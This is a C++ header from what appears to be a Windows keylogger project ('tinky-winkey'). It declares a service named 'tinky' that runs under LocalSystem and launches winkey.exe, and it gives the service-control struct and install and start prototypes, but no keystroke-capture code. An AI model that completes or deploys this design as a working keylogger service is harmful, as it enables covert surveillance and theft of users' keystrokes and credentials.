#pragma once

#define UNICODE
#define _UNICODE

#include "winMandatory.h"
#include <windows.h>
#include <iostream>

//#include "unicode.h"

// =============== Magic variables ========== //
#define EVENTNAME TEXT("Global\\stop_winkey_process")
#define USER_NAME TEXT(".\\keylogger")
#define LOCALSYS TEXT("keylogger\\LocalSystem")
#define SVC_NAME TEXT("tinky")
#define DEF_NAME ""
#define WINKEY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\winkey.exe")
#define BINARY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\prog.exe")
// global {
#define NONE 0
#define FAILURE 0
#define SUCCESS 1
// }
// main() {
#define NFUNC 0x4
// }
// ============================================= //

// =============== Structs =============== //
#pragma pack(1)
typedef struct tinky {
	// install {
	SC_HANDLE	HServiceControlManager;
	SC_HANDLE	HService;
	WORD		onSingleProcess;
	// }

	// start {
	SERVICE_STATUS			svcStatus;
	SERVICE_STATUS_HANDLE	svcStatusHandle;
	HANDLE					svcStopEventHandle;
	HANDLE					eventHandle;
	STARTUPINFO 			startupInfo;
	PROCESS_INFORMATION 	processInfo;
	// }
}	tinky_t;
// ============================================= //

// =============== createService.cpp ===============//
int install(tinky_t *tinky);
// =============== start.cpp =============== //
int start(tinky_t *tinky);

// =============== service control managed =============== //
#define BIN_NAME ".\\winkey"
int startedBySCM(void);